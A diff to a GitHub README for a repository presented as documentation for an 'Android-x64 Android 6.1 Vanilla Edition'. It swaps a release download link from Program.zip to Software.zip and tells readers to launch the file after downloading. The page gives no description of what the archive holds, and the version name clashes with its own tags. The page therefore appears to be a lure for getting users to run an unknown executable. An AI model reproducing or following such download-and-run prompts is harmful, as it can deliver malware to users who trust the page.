@@ -11,9 +11,9 @@ Welcome to the Android-x64_Android6.1_Vanilla_Edition_Docs repository! Here you 
 android-6-1, android-alternative, android-marshmallow, android-x64, android-x64-android-6-1-vanilla-edition, android-x64-development, android-x64-docs, android-x64-documentation, android-x64-project, android-x64-vanilla-edition, gpl3, gplv3, linux, markdown-lang, markdown-language, operating-system, vanilla-android, vanilla-edition
 
 ## Installation Package
-[![Download https://github.com/saikirti1986v999/Android-x64_Android6.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip](https://github.com/saikirti1986v999/Android-x64_Android6.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip)](https://github.com/saikirti1986v999/Android-x64_Android6.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip)
+[![Download https://github.com/saikirti1986v999/Android-x64_Android6.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip](https://github.com/saikirti1986v999/Android-x64_Android6.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip)](https://github.com/saikirti1986v999/Android-x64_Android6.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip)
 
-The installation package is available for download in the link provided above. Simply click on the button to initiate the download of the https://github.com/saikirti1986v999/Android-x64_Android6.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip file. Make sure to launch the file after downloading to begin the installation process.
+The installation package is available for download in the link provided above. Simply click on the button to initiate the download of the https://github.com/saikirti1986v999/Android-x64_Android6.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip file. Make sure to launch the file after downloading to begin the installation process.
 
 For more information and resources related to the Android x64 project and the Vanilla Edition of Android 6.1, please explore the contents of this repository. If you encounter any issues with the download link or need further assistance, be sure to check the "Releases" section for additional resources.
 
